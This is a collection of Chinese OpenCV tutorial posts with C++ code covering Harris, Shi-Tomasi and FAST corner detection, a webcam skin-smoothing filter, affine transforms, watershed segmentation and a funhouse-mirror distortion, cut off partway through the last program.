            //默认3*3核膨胀，膨胀之后，除了局部最大值点和原来相同，其它非局部最大值点被
            //3*3邻域内的最大值点取代
            cv::dilate (cornerStrength,dilated,cv::Mat());
            //与原图相比，只剩下和原图值相同的点，这些点都是局部最大值点，保存到localMax
            cv::compare(cornerStrength,dilated,localMax,cv::CMP_EQ);
    }

    //获取角点图
    cv::Mat getCornerMap(double qualityLevel) {
            cv::Mat cornerMap;
            // 根据角点响应最大值计算阈值
            threshold= qualityLevel*maxStrength;
            cv::threshold(cornerStrength,cornerTh,
            threshold,255,cv::THRESH_BINARY);
            // 转为8-bit图
            cornerTh.convertTo(cornerMap,CV_8U);
            // 和局部最大值图与，剩下角点局部最大值图，即：完成非最大值抑制
            cv::bitwise_and(cornerMap,localMax,cornerMap);
            return cornerMap;
    }

    void getCorners(std::vector<cv::Point> &points,
            double qualityLevel) {
            //获取角点图
            cv::Mat cornerMap= getCornerMap(qualityLevel);
            // 获取角点
            getCorners(points, cornerMap);
    }

    // 遍历全图，获得角点
    void getCorners(std::vector<cv::Point> &points,
    const cv::Mat& cornerMap) {

            for( int y = 0; y < cornerMap.rows; y++ ) {
                    const uchar* rowPtr = cornerMap.ptr<uchar>(y);
                    for( int x = 0; x < cornerMap.cols; x++ ) {
                    // 非零点就是角点
                          if (rowPtr[x]) {
                                points.push_back(cv::Point(x,y));
                          }
                     }
                }
          }

    //用圈圈标记角点
    void drawOnImage(cv::Mat &image,
    const std::vector<cv::Point> &points,
            cv::Scalar color= cv::Scalar(255,255,255),
            int radius=3, int thickness=2) {
                    std::vector<cv::Point>::const_iterator it=points.begin();
                    while (it!=points.end()) {
                    // 角点处画圈
                    cv::circle(image,*it,radius,color,thickness);
                    ++it;
            }
    }

};

#endif // HARRIS_H
相关测试代码：
 cv::Mat  image, image1 = cv::imread ("test.jpg");
    //灰度变换
    cv::cvtColor (image1,image,CV_BGR2GRAY);


    // 经典的harris角点方法
    harris Harris;
    // 计算角点
    Harris.detect(image);
    //获得角点
    std::vector<cv::Point> pts;
    Harris.getCorners(pts,0.01);
    // 标记角点
    Harris.drawOnImage(image,pts);

    cv::namedWindow ("harris");
    cv::imshow ("harris",image);
    cv::waitKey (0);
    return 0;
相关测试结果：

三、改进的Harris角点检测
    从经典的Harris角点检测方法不难看出，该算法的稳定性和k有关，而k是个经验值，不好把握，浮动也有可能较大。鉴于此，改进的Harris方法（）直接计算出两个特征值，通过比较两个特征值直接分类，这样就不用计算Harris响应函数了。
    另一方面，我们不再用非极大值抑制了，而选取容忍距离：容忍距离内只有一个特征点。 
    该算法首先选取一个具有最大   最小特征值的点（即：max（min（e1，e2）），e1，e2是harris矩阵的特征值）作为角点，然后依次按照最大最小特征值顺序寻找余下的角点，当然和前一角点距离在容忍距离内的新角点呗忽略。
    opencv测试该算法代码如下：
    cv::Mat  image, image1 = cv::imread ("test.jpg");     //灰度变换     cv::cvtColor (image1,image,CV_BGR2GRAY);     // 改进的harris角点检测方法
    std::vector<cv::Point> corners;
    cv::goodFeaturesToTrack(image,corners,
    200,
    //角点最大数目
    0.01,
    // 质量等级，这里是0.01*max（min（e1，e2）），e1，e2是harris矩阵的特征值
    10);
    // 两个角点之间的距离容忍度
    harris().drawOnImage(image,corners);//标记角点
     测试结果如下： 
四、FAST角点检测
    算法原理比较简单，但实时性很强。
    该算法的角点定义为：若某像素点圆形邻域圆周上有3/4的点和该像素点不同（编程时不超过某阈值th），则认为该点就是候选角点。opencv更极端，选用半径为3的圆周上（上下左右）四个点，若超过三个点和该像素点不同，则该点为候选角点。
    和Harris算法类似，该算法需要非极大值抑制。
opencv代码：
    cv::Mat  image, image1 = cv::imread ("test.jpg");
    cv::cvtColor (image1,image,CV_BGR2GRAY);
    //快速角点检测
    std::vector<cv::KeyPoint> keypoints;
    cv::FastFeatureDetector fast(40,true);
    fast .detect (image,keypoints);
    cv::drawKeypoints (image,keypoints,image,cv::Scalar::all(255),cv::DrawMatchesFlags::DRAW_OVER_OUTIMG);
测试结果如下：

五、参考文献
【1】The classical article describing the Harris operator: C. Harris and M.J. Stephens, A combined  corner and edge detector, by Alvey Vision Conference, pp. 147–152, 1988.
【2】The article by J. Shi and C. Tomasi, Good features to track, Int. Conference on Computer Vision  and Pattern Recognition, pp. 593-600, 1994 which introduced these features.
【3】The article by K. Mikolajczyk and C. Schmid, Scale and Affine invariant interest point  detectors, International Journal of Computer Vision, vol 60, no 1, pp. 63-86, 2004, which proposes a multi-scale and affine-invariant Harris operator.
【4】The article by E. Rosten and T. Drummond, Machine learning for high-speed corner detection, in In European Conference on Computer Vision, pp. 430-443, 2006 that describes the FAST feature algorithm in detail
六、附录
我传的资源链接，源码和相关文档。
http://download.csdn.net/detail/crzy_sparrow/4170311






        为什么美颜摄像这么简单的功能，OpenCV这个开源项目网上很少有代码呢？对于在windows平台下，生成h264视频流也比价麻烦，没有现成的api可以使用，需要借助MinGw编译libx264，或者ffmpeg才能使用。
最近有个小需求，要推送直播视频流，我在网上查了一下有live555或者用librtmp来推送，但是前者还需要修改源代码，也挺麻烦的，现在先做到了下面几个步骤：
1.OpenCV捕捉摄像头的图像
2.进行识别需要美颜的部分（人脸识别，肤色识别）
3.进行美颜（提升亮度，直方图均衡，滤波）
4.生成YUV视频
5.生成h264

现在用librtmp时候，出现了
ERROR:RTMP_Connect0,failed to connect socket,10061(unknow error)
不知道是咋回事了，怀疑是1935端口被禁，但是一时半会儿不知道咋弄。

主要功能代码：


/** Global variables */
//-- Note, either copy these two files from opencv/data/haarscascades to your current folder, or change these locations
string face_cascade_name = "haarcascade_frontalface_alt.xml";

CascadeClassifier face_cascade;
CascadeClassifier eyes_cascade;
string window_name_onlyface = "Capture - only Face";
string window_name_face = "Capture - Face ";


/**
* @function detectAndDisplay
*/
void detectAndenhance( Mat &frame )
{
	std::vector<Rect> faces;
	Mat frame_gray;
	Mat hatAlpha;

	//hatAlpha = imread("2.png",-1);//圣诞帽的图片

	cvtColor( frame, frame_gray, COLOR_BGR2GRAY );
	//equalizeHist( frame_gray, frame_gray );
	//-- Detect faces
	face_cascade.detectMultiScale( frame_gray, faces, 1.1, 2, 0|CV_HAAR_SCALE_IMAGE, Size(30, 30) );

	for( size_t i = 0; i < faces.size(); i++ )
	{
		Rect face(faces[i].x,faces[i].y,faces[i].x + faces[i].width,faces[i].y + faces[i].height);
		cvSetImageROI(&IplImage(frame),face);

		

		// Do the porcess
		blur(frame,frame,Size(7,7),Point(-1,-1));
		//////////////////////////////////////////////
		cvResetImageROI( &IplImage(frame) );
		Point center( faces[i].x + faces[i].width/2, faces[i].y + faces[i].height/2 );
		ellipse( frame, center, Size( faces[i].width/2, faces[i].height/2), 0, 0, 360, Scalar( 255, 0, 255 ), 2, 8, 0 );

		// line(frame,Point(faces[i].x,faces[i].y),center,Scalar(255,0,0),5);

		Mat faceROI = frame_gray( faces[i] );
		std::vector<Rect> eyes;

		imshow( window_name_onlyface, faceROI );
		
	}
	//-- Show what you got
	imshow( window_name_face, frame );
	//imwrite("merry christmas.jpg",frame);
}

/** @函数 detectAndDisplay */
void detectAndDisplay( Mat frame )
{
	std::vector<Rect> faces;
	Mat frame_gray;

	cvtColor( frame, frame_gray, CV_BGR2GRAY );
	equalizeHist( frame_gray, frame_gray );

	//-- 多尺寸检测人脸
	face_cascade.detectMultiScale( frame_gray, faces, 1.1, 2, 0|CV_HAAR_SCALE_IMAGE, Size(30, 30) );

	for( int i = 0; i < faces.size(); i++ )
	{
		Point center( faces[i].x + faces[i].width*0.5, faces[i].y + faces[i].height*0.5 );
		ellipse( frame, center, Size( faces[i].width*0.5, faces[i].height*0.5), 0, 0, 360, Scalar( 255, 0, 255 ), 4, 8, 0 );

		Mat faceROI = frame_gray( faces[i] );
		std::vector<Rect> eyes;

		//-- 在每张人脸上检测双眼
		eyes_cascade.detectMultiScale( faceROI, eyes, 1.1, 2, 0 |CV_HAAR_SCALE_IMAGE, Size(30, 30) );

		for( int j = 0; j < eyes.size(); j++ )
		{
			Point center( faces[i].x + eyes[j].x + eyes[j].width*0.5, faces[i].y + eyes[j].y + eyes[j].height*0.5 );
			int radius = cvRound( (eyes[j].width + eyes[i].height)*0.25 );
			circle( frame, center, radius, Scalar( 255, 0, 0 ), 4, 8, 0 );
		}
	}
	//-- 显示结果图像
	imshow( window_name_face, frame );
}



// add by shiter 2016/3/3

Mat equalizeChannelHist(const Mat & inputImage)  
{  
	if( inputImage.channels() >= 3 )  
	{  
		vector<Mat> channels;  
		split(inputImage, channels);  

		Mat B,G,R;  

		equalizeHist( channels[0], B );  
		equalizeHist( channels[1], G );  
		equalizeHist( channels[2], R );  

		vector<Mat> combined;  
		combined.push_back(B);  
		combined.push_back(G);  
		combined.push_back(R);  

		Mat result;  
		merge(combined, result);  

		return result;  
	}
	else{return inputImage;}

	return inputImage;  
}  


Mat equalizeIntensityHist(const Mat & inputImage)  
{  
	if(inputImage.channels() >= 3)  
	{  
		Mat ycrcb;  

		cvtColor(inputImage, ycrcb, COLOR_BGR2YCrCb);  

		vector<Mat> channels;  
		split(ycrcb, channels);  

		equalizeHist(channels[0], channels[0]);  

		Mat result;  
		merge(channels,ycrcb);  

		cvtColor(ycrcb, result, COLOR_YCrCb2BGR);  

		return result;  
	}  

	return Mat();  
}  



//皮肤检测,并针对皮肤进行增强，模糊
void MySkinEnhance(Mat &frame)
{
	Mat input_image =frame;  
	Mat output_mask;  
	Mat output_image;  
	Mat mask;  
	//肤色椭圆  
	/*椭圆皮肤模型*/  
	Mat skinCrCbHist = Mat::zeros(Size(256, 256), CV_8UC1);  
	ellipse(skinCrCbHist, Point(113, 155.6), Size(23.4, 15.2), 43.0, 0.0, 360.0, Scalar(255, 255, 255), -1);  

	Mat element = getStructuringElement(MORPH_RECT, Size(3, 3), Point(-1, -1) );  

	if(input_image.empty())  
		return ;  

	Mat ycrcb_image;  
	output_mask = Mat::zeros(input_image.size(), CV_8UC1);  
	cvtColor(input_image, ycrcb_image, CV_BGR2YCrCb); //首先转换成到YCrCb空间  

	for(int i = 0; i < input_image.rows; i++) //利用椭圆皮肤模型进行皮肤检测  
	{  
		uchar* p = (uchar*)output_mask.ptr<uchar>(i);  
		Vec3b* ycrcb = (Vec3b*)ycrcb_image.ptr<Vec3b>(i);  
		for(int j = 0; j < input_image.cols; j++)  
		{  
			if(skinCrCbHist.at<uchar>(ycrcb[j][1], ycrcb[j][2]) > 0)  
				p[j] = 255;  
		}  
	}     

	//morphologyEx(output_mask,output_mask,MORPH_CLOSE,element);  

	 //output_mask.setTo(0);  
		
		dilate(output_mask,output_mask,Mat(32,32,CV_8U),Point(-1,-1),2);
		//imwrite("dilate.jpg",dst);
	// output_image.setTo(0);  
		input_image.copyTo(output_image, output_mask);  
		
		Mat enhance = output_image;
		medianBlur(output_image,enhance,11);
		//blur(enhance,enhance,Size(4,4),Point(-1,-1),4);
		imshow("blur face",enhance);
		for(int i = 0; i < output_image.rows; i++) //
		{  
			uchar* p = (uchar*)output_mask.ptr<uchar>(i);  

			for(int j = 0; j < output_image.cols; j++)  
			{  
				if((enhance.at<Vec3b>(i,j)[0] < 50) && (enhance.at<Vec3b>(i,j)[1] < 50)&& (enhance.at<Vec3b>(i,j)[2] < 50) ) 
				{
					//不是纯黑的
					
					
				}
				else
				{

					frame.at<Vec3b>(i,j)[0] =  enhance.at<Vec3b>(i,j)[0];

					frame.at<Vec3b>(i,j)[1] = enhance.at<Vec3b>(i,j)[1];
					frame.at<Vec3b>(i,j)[2] = enhance.at<Vec3b>(i,j)[2];
				}
			}  
		}     
		// 图像融合
		//addWeighted(input_image, 0.95, enhance, 0.05, 0.0, input_image);  
		imshow("ouput image",frame);

}


//提高亮度对比度
void highlight(Mat &frame)
{
	Mat src,dst;  
	double alpha =1.5;  
	double beta = 20;  

	src = frame; 
	if(!src.data)  
	{  
		cout<<"Failed to load image!"<<endl;  
		return ;  
	}  



	//dst = Mat::zeros(src.size(),src.type());  
	for (int i = 0;i<src.rows;++i) 
	{
		//uchar* inData=src.ptr<uchar>(i);
		
		for(int j= 0;j<src.cols;++j) 
		{
			 
				/*src.at<Vec3b>(i,j)[0] = saturate_cast<uchar>(src.at<Vec3b>(i,j)[0]*alpha+beta); 
				src.at<Vec3b>(i,j)[1] = saturate_cast<uchar>(src.at<Vec3b>(i,j)[1]*alpha+beta); 
				src.at<Vec3b>(i,j)[2] = saturate_cast<uchar>(src.at<Vec3b>(i,j)[2]*alpha+beta); */
				//上面的效率低，下面的有越界
				src.at<Vec3b>(i,j)[0] = (src.at<Vec3b>(i,j)[0]*alpha+beta); 
				src.at<Vec3b>(i,j)[1] = (src.at<Vec3b>(i,j)[1]*alpha+beta); 
				src.at<Vec3b>(i,j)[2] = (src.at<Vec3b>(i,j)[2]*alpha+beta);
			
		}
	}

	namedWindow("Handled Image");  
	imshow("Handled Image",src);  
	//waitKey();  
}


实现效果：实时实现的话我只加了肤色检测和简单的滤波，具体美化还需要进一步调试
参数和算法 的组合可以在代码中调整参数实现，可以把膨胀的参数调大一点这个整个人脸就差不多可以经过肤色检测全部搞出来。
完整工程代码：http://download.csdn.net/detail/wangyaninglm/9453146


参考文献：

肤色检测：http://blog.csdn.net/yangtrees/article/details/8269984
人像优化：http://blog.csdn.net/u011630458/article/details/46275469
肤色检测：http://blog.csdn.net/wj080211140/article/details/23384927
改变对比读：http://blog.csdn.net/ubunfans/article/details/24373811

直接推送直播流：http://blog.csdn.net/wangyaninglm/article/details/51056101







什么是仿射变换?¶

一个任意的仿射变换都能表示为 乘以一个矩阵 (线性变换) 接着再 加上一个向量 (平移).

综上所述, 我们能够用仿射变换来表示:
旋转 (线性变换)平移 (向量加)缩放操作 (线性变换)你现在可以知道, 事实上, 仿射变换代表的是两幅图之间的 关系 .
 

 
 


#include "opencv2/highgui/highgui.hpp"
#include "opencv2/imgproc/imgproc.hpp"
#include <iostream>
#include <stdio.h>

using namespace cv;
using namespace std;

/// 全局变量
char* source_window = "Source image";
char* warp_window = "Warp";
char* warp_rotate_window = "Warp + Rotate";

/** @function main */
 int main( int argc, char** argv )
 {
   Point2f srcTri[3];
   Point2f dstTri[3];

   Mat rot_mat( 2, 3, CV_32FC1 );
   Mat warp_mat( 2, 3, CV_32FC1 );
   Mat src, warp_dst, warp_rotate_dst;

   /// 加载源图像
   src = imread( argv[1], 1 );

   /// 设置目标图像的大小和类型与源图像一致
   warp_dst = Mat::zeros( src.rows, src.cols, src.type() );

   /// 设置源图像和目标图像上的三组点以计算仿射变换
   srcTri[0] = Point2f( 0,0 );
   srcTri[1] = Point2f( src.cols - 1, 0 );
   srcTri[2] = Point2f( 0, src.rows - 1 );

   dstTri[0] = Point2f( src.cols*0.0, src.rows*0.33 );
   dstTri[1] = Point2f( src.cols*0.85, src.rows*0.25 );
   dstTri[2] = Point2f( src.cols*0.15, src.rows*0.7 );

   /// 求得仿射变换
   warp_mat = getAffineTransform( srcTri, dstTri );

   /// 对源图像应用上面求得的仿射变换
   warpAffine( src, warp_dst, warp_mat, warp_dst.size() );

   /** 对图像扭曲后再旋转 */

   /// 计算绕图像中点顺时针旋转50度缩放因子为0.6的旋转矩阵
   Point center = Point( warp_dst.cols/2, warp_dst.rows/2 );
   double angle = -50.0;
   double scale = 0.6;

   /// 通过上面的旋转细节信息求得旋转矩阵
   rot_mat = getRotationMatrix2D( center, angle, scale );

   /// 旋转已扭曲图像
   warpAffine( warp_dst, warp_rotate_dst, rot_mat, warp_dst.size() );

   /// 显示结果
   namedWindow( source_window, CV_WINDOW_AUTOSIZE );
   imshow( source_window, src );

   namedWindow( warp_window, CV_WINDOW_AUTOSIZE );
   imshow( warp_window, warp_dst );

   namedWindow( warp_rotate_window, CV_WINDOW_AUTOSIZE );
   imshow( warp_rotate_window, warp_rotate_dst );

   /// 等待用户按任意按键退出程序
   waitKey(0);

   return 0;
  }




说明¶

定义一些需要用到的变量, 比如需要用来储存中间和目标图像的Mat和两个需要用来定义仿射变换的二维点数组.

Point2f srcTri[3];
Point2f dstTri[3];

Mat rot_mat( 2, 3, CV_32FC1 );
Mat warp_mat( 2, 3, CV_32FC1 );
Mat src, warp_dst, warp_rotate_dst;



加载源图像:

src = imread( argv[1], 1 );



以与源图像同样的类型和大小来对目标图像初始化:

warp_dst = Mat::zeros( src.rows, src.cols, src.type() );



仿射变换: 正如上文所说, 我们需要源图像和目标图像上分别一一映射的三个点来定义仿射变换:

srcTri[0] = Point2f( 0,0 );
srcTri[1] = Point2f( src.cols - 1, 0 );
srcTri[2] = Point2f( 0, src.rows - 1 );

dstTri[0] = Point2f( src.cols*0.0, src.rows*0.33 );
dstTri[1] = Point2f( src.cols*0.85, src.rows*0.25 );
dstTri[2] = Point2f( src.cols*0.15, src.rows*0.7 );


你可能想把这些点绘出来以获得对变换的更直观感受. 他们的位置大概就是在上面图例中的点的位置 (原理部分). 你会注意到由三点定义的三角形的大小和方向改变了.

通过这两组点, 我们能够使用OpenCV函数 getAffineTransform 来求出仿射变换:

warp_mat = getAffineTransform( srcTri, dstTri );


我们获得了用以描述仿射变换的 2X3 矩阵 (在这里是 warp_mat)

将刚刚求得的仿射变换应用到源图像

warpAffine( src, warp_dst, warp_mat, warp_dst.size() );


函数有以下参数:
src: 输入源图像warp_dst: 输出图像warp_mat: 仿射变换矩阵warp_dst.size(): 输出图像的尺寸这样我们就获得了变换后的图像! 我们将会把它显示出来. 在此之前, 我们还想要旋转它...

旋转: 想要旋转一幅图像, 你需要两个参数:
旋转图像所要围绕的中心旋转的角度. 在OpenCV中正角度是逆时针的可选择: 缩放因子我们通过下面的代码来定义这些参数:

Point center = Point( warp_dst.cols/2, warp_dst.rows/2 );
double angle = -50.0;
double scale = 0.6;



我们利用OpenCV函数 getRotationMatrix2D 来获得旋转矩阵,
 这个函数返回一个 2X3  矩阵 (这里是 rot_mat)

rot_mat = getRotationMatrix2D( center, angle, scale );



现在把旋转应用到仿射变换的输出.

warpAffine( warp_dst, warp_rotate_dst, rot_mat, warp_dst.size() );



最后我们把仿射变换和旋转的结果绘制在窗体中，源图像也绘制出来以作参照:

namedWindow( source_window, CV_WINDOW_AUTOSIZE );
imshow( source_window, src );

namedWindow( warp_window, CV_WINDOW_AUTOSIZE );
imshow( warp_window, warp_dst );

namedWindow( warp_rotate_window, CV_WINDOW_AUTOSIZE );
imshow( warp_rotate_window, warp_rotate_dst );



等待用户退出程序

waitKey(0);


 






种子点的标记没有太搞懂，这个算法的速度还是很快的
 

 
// watershed_test20140801.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

//
// ch9_watershed image
//   This is an exact copy of the watershed.cpp demo in the OpenCV ../samples/c directory
//
// Think about using a morphologically eroded forground and background segmented image as the template
// for the watershed algorithm to segment objects by color and edges for collecting 
//
/* *************** License:**************************
   Oct. 3, 2008
   Right to use this code in any way you want without warrenty, support or any guarentee of it working.

   BOOK: It would be nice if you cited it:
   Learning OpenCV: Computer Vision with the OpenCV Library
     by Gary Bradski and Adrian Kaehler
     Published by O'Reilly Media, October 3, 2008
 
   AVAILABLE AT: 
     http://www.amazon.com/Learning-OpenCV-Computer-Vision-Library/dp/0596516134
     Or: http://oreilly.com/catalog/9780596516130/
     ISBN-10: 0596516134 or: ISBN-13: 978-0596516130    

   OTHER OPENCV SITES:
   * The source code is on sourceforge at:
     http://sourceforge.net/projects/opencvlibrary/
   * The OpenCV wiki page (As of Oct 1, 2008 this is down for changing over servers, but should come back):
     http://opencvlibrary.sourceforge.net/
   * An active user group is at:
     http://tech.groups.yahoo.com/group/OpenCV/
   * The minutes of weekly OpenCV development meetings are at:
     http://pr.willowgarage.com/wiki/OpenCV
   ************************************************** */

#include "cv.h"
#include "highgui.h"
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
using namespace std;
using namespace cv;


#pragma comment(lib,"opencv_core2410d.lib")      
#pragma comment(lib,"opencv_highgui2410d.lib")      
#pragma comment(lib,"opencv_imgproc2410d.lib")  

IplImage* marker_mask = 0;
IplImage* markers = 0;
IplImage* img0 = 0, *img = 0, *img_gray = 0, *wshed = 0;
CvPoint prev_pt = {-1,-1};

void on_mouse( int event, int x, int y, int flags, void* param )
{
    if( !img )
        return;

    if( event == CV_EVENT_LBUTTONUP || !(flags & CV_EVENT_FLAG_LBUTTON) )
        prev_pt = cvPoint(-1,-1);
    else if( event == CV_EVENT_LBUTTONDOWN )
        prev_pt = cvPoint(x,y);
    else if( event == CV_EVENT_MOUSEMOVE && (flags & CV_EVENT_FLAG_LBUTTON) )
    {
        CvPoint pt = cvPoint(x,y);
        if( prev_pt.x < 0 )
            prev_pt = pt;
        cvLine( marker_mask, prev_pt, pt, cvScalarAll(255), 5, 8, 0 );
        cvLine( img, prev_pt, pt, cvScalarAll(255), 5, 8, 0 );
        prev_pt = pt;
        cvShowImage( "image", img );
    }
}


int main( int argc, char** argv )
{
    cout<<"input image name:  "<<endl; 
	string file;
	cin>>file;


	char* filename = (char *)file.c_str();

    CvRNG rng = cvRNG(-1);

    if( (img0 = cvLoadImage(filename,1)) == 0 )
        return 0;

    printf( "Hot keys: \n"
            "\tESC - quit the program\n"
            "\tr - restore the original image\n"
            "\tw or ENTER - run watershed algorithm\n"
            "\t\t(before running it, roughly mark the areas on the image)\n"
            "\t  (before that, roughly outline several markers on the image)\n" );
    
    cvNamedWindow( "image", 1 );
    cvNamedWindow( "watershed transform", 1 );

    img = cvCloneImage( img0 );
    img_gray = cvCloneImage( img0 );
    wshed = cvCloneImage( img0 );
    marker_mask = cvCreateImage( cvGetSize(img), 8, 1 );
    markers = cvCreateImage( cvGetSize(img), IPL_DEPTH_32S, 1 );
    cvCvtColor( img, marker_mask, CV_BGR2GRAY );
    cvCvtColor( marker_mask, img_gray, CV_GRAY2BGR );

    cvZero( marker_mask );
    cvZero( wshed );
    cvShowImage( "image", img );
    cvShowImage( "watershed transform", wshed );
    cvSetMouseCallback( "image", on_mouse, 0 );

    for(;;)
    {
        int c = cvWaitKey(0);

        if( (char)c == 27 )
            break;

        if( (char)c == 'r' )
        {
            cvZero( marker_mask );
            cvCopy( img0, img );
            cvShowImage( "image", img );
        }

        if( (char)c == 'w' || (char)c == '\n' )
        {
            CvMemStorage* storage = cvCreateMemStorage(0);
            CvSeq* contours = 0;
            CvMat* color_tab;
            int i, j, comp_count = 0;
            //cvSaveImage( "wshed_mask.png", marker_mask );
            //marker_mask = cvLoadImage( "wshed_mask.png", 0 );
            cvFindContours( marker_mask, storage, &contours, sizeof(CvContour),
                            CV_RETR_CCOMP, CV_CHAIN_APPROX_SIMPLE );
            cvZero( markers );
            for( ; contours != 0; contours = contours->h_next, comp_count++ )
            {
                cvDrawContours( markers, contours, cvScalarAll(comp_count+1),
                                cvScalarAll(comp_count+1), -1, -1, 8, cvPoint(0,0) );
            }

            color_tab = cvCreateMat( 1, comp_count, CV_8UC3 );
            for( i = 0; i < comp_count; i++ )
            {
                uchar* ptr = color_tab->data.ptr + i*3;
                ptr[0] = (uchar)(cvRandInt(&rng)%180 + 50);
                ptr[1] = (uchar)(cvRandInt(&rng)%180 + 50);
                ptr[2] = (uchar)(cvRandInt(&rng)%180 + 50);
            }

            {
            double t = (double)cvGetTickCount();
            cvWatershed( img0, markers );
            t = (double)cvGetTickCount() - t;
            printf( "exec time = %gms\n", t/(cvGetTickFrequency()*1000.) );
            }

            // paint the watershed image
            for( i = 0; i < markers->height; i++ )
                for( j = 0; j < markers->width; j++ )
                {
                    int idx = CV_IMAGE_ELEM( markers, int, i, j );
                    uchar* dst = &CV_IMAGE_ELEM( wshed, uchar, i, j*3 );
                    if( idx == -1 )
                        dst[0] = dst[1] = dst[2] = (uchar)255;
                    else if( idx <= 0 || idx > comp_count )
                        dst[0] = dst[1] = dst[2] = (uchar)0; // should not get here
                    else
                    {
                        uchar* ptr = color_tab->data.ptr + (idx-1)*3;
                        dst[0] = ptr[0]; dst[1] = ptr[1]; dst[2] = ptr[2];
                    }
                }

            cvAddWeighted( wshed, 0.5, img_gray, 0.5, 0, wshed );
            cvShowImage( "watershed transform", wshed );
            cvReleaseMemStorage( &storage );
            cvReleaseMat( &color_tab );
        }
    }

    return 1;
}



 
 
 
实现效果：
 

 
 






代码，有参考别人的代码
// haha_mirror.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include<iostream>


#include "cv.h"
#include "highgui.h"
#include "math.h"
#include "opencv2/core/core.hpp"

#pragma comment(lib,"opencv_core2410d.lib")              
#pragma comment(lib,"opencv_highgui2410d.lib")              
#pragma comment(lib,"opencv_imgproc2410d.lib")   



#define DOWNRESIZE 0 // 缩小
#define UPRESIZE   1 // 放大
#define HORAO      2 // 水平外凹
#define HORTU      3 // 水平外凸
#define LADDER     4 // 梯形变形
#define TRIANGLE   5 // 三角形变形
#define SSHAPE     6 // S形变形
#define WAVESHAPE  7 // 波浪形变形
#define Concentrated 8 //集中形变形
#define Scattered   9 // 散开形变形

#define RANGE     100 // 水平外凹或外凸的幅度
#define PI        3.1415926

using namespace std;
using namespace cv;

void MaxFrame(IplImage* frame)
{
	uchar* old_data = (uchar*)frame->imageData;
	uchar* new_data = new uchar[frame->widthStep * frame->height];

	int center_X = frame->width / 2;
	int center_Y = frame->height / 2;
	int radius = 400;
	int newX = 0;
	int newY = 0;

	int real_radius = (int)(radius / 2.0);
	for (int i = 0; i < frame->width; i++)
	{
		for (int j = 0; j < frame->height; j++)
		{
			int tX = i - center_X;
			int tY = j - center_Y;

			int distance = (int)(tX * tX + tY * tY);
			if (distance < radius * radius)
			{
				newX = (int)((float)(tX) / 2.0);
				newY = (int)((float)(tY) / 2.0);

				newX = (int) (newX * (sqrt((double)distance) / real_radius));
				newX = (int) (newX * (sqrt((double)distance) / real_radius));

				newX = newX + center_X;
				newY = newY + center_Y;

				new_data[frame->widthStep * j + i * 3] = old_data[frame->widthStep * newY + newX * 3];
				new_data[frame->widthStep * j + i * 3 + 1] =old_data[frame->widthStep * newY + newX * 3 + 1];
				new_data[frame->widthStep * j + i * 3 + 2] =old_data[frame->widthStep * newY + newX * 3 + 2];
			}
			else
			{
				new_data[frame->widthStep * j + i * 3] =  old_data[frame->widthStep * j + i * 3];
				new_data[frame->widthStep * j + i * 3 + 1] =  old_data[frame->widthStep * j + i * 3 + 1];
				new_data[frame->widthStep * j + i * 3 + 2] =  old_data[frame->widthStep * j + i * 3 + 2];
			}
		}
	}
	memcpy(old_data, new_data, sizeof(uchar) * frame->widthStep * frame->height);
	delete[] new_data;
}


void MinFrame(IplImage* frame)
{
	uchar* old_data = (uchar*)frame->imageData;
	uchar* new_data = new uchar[frame->widthStep * frame->height];

	int center_X = frame->width / 2;
	int center_Y = frame->height / 2;

	int radius = 0;
	double theta = 0;
	int newX = 0;
	int newY = 0;

	for (int i = 0; i < frame->width; i++)
	{
		for (int j = 0; j < frame->height; j++)
		{
			int tX = i - center_X;
			int tY = j - center_Y;

			theta = atan2((double)tY, (double)tX);
			radius = (int)sqrt((double)(tX * tX) + (double) (tY * tY));
			int newR = (int)(sqrt((double)radius) * 12);
			newX = center_X + (int)(newR * cos(theta));
			newY = center_Y + (int)(newR * sin(theta));

			if (!(newX > 0 && newX < frame->width))
			{
				newX = 0;
			}
			if (!(newY > 0 && newY < frame->height))
			{
				newY = 0;
			}

			new_data[frame->widthStep * j + i * 3] = old_data[frame->widthStep * newY + newX * 3];
			new_data[frame->widthStep * j + i * 3 + 1] =old_data[frame->widthStep * newY + newX * 3 + 1];
			new_data[frame->widthStep * j + i * 3 + 2] =old_data[frame->widthStep * newY + newX * 3 + 2];
		}
	}
	memcpy(old_data, new_data, sizeof(uchar) * frame->widthStep * frame->height);
	delete[] new_data;
}

// 哈哈镜制作
int main( int argc, char** argv )
{
	IplImage* pImg; //声明IplImage指针
	IplImage* pImg1; //声明IplImage指针
	int i,j;
	int method = 0;
	CvSize size;
	double tmp;

	method = 8;
	//method = HORAO;

	//载入图像
	pImg = cvLoadImage( "lena.jpg", 1);
	cvNamedWindow( "Image", 1 );//创建窗口
	cvShowImage( "Image", pImg );//显示图像
	printf("imageSize: %d height: %d, width: %d, nChannels: %d\n", pImg->imageSize, pImg->height, pImg->width, pImg->nChannels);

	//MaxFrame(pImg);
	//MinFrame(pImg);

	switch(method)
	{
		// 图像缩小
	case DOWNRESIZE:
		size = cvGetSize(pImg);
		size.width = (size.width>>3)<<2; // 在OpenCV里边，widthStep必须是4的倍数，从而实现字节对齐，有利于提高运算速度。
		size.height =  size.height>>1;
		pImg1 = cvCreateImage( size, IPL_DEPTH_8U, 1);
		printf("imageSize: %d height: %d, width: %d, nChannels: %d\n", pImg1->imageSize, pImg1->height, pImg1->width, pImg1->nChannels);
		for(i=0;i<pImg1->height;i++)
			for(j=0;j<pImg1->width;j++)
			{
				pImg1->imageData[i*pImg1->width+j] = pImg->imageData[i*2*pImg->width+j*2];
			}
			break;
			// 图像放大
	case UPRESIZE:
		/* 添加代码 */
		break;
		// 水平外凹
	case HORAO:
		pImg1 = cvCreateImage( cvGetSize(pImg), IPL_DEPTH_8U, 1);
		printf("imageSize: %d height: %d, width: %d, nChannels: %d\n", pImg1->imageSize, pImg1->height, pImg1->width, pImg1->nChannels);
		for(i=0;i<pImg1->height;i++)
		{
			tmp = RANGE*sin(i*PI/pImg1->height);
			for(j=tmp;j<pImg1->width-tmp;j++)
			{
				pImg1->imageData[i*pImg1->width+j] = pImg->imageData[i*pImg->width+(int)((j-tmp)*(pImg->width)/(pImg->width-2*tmp))];
			}
		}
		break;
		// 水平外凸
	case HORTU:
		/* 添加代码 */
		break;
		// 梯形变形
	case LADDER:
		/* 添加代码 */
		break;
		// 三角形变形
	case TRIANGLE:
		/* 添加代码 */
		break;
		// S形变形
	case SSHAPE:
		/* 添加代码 */
		break;
		// 波浪形变形
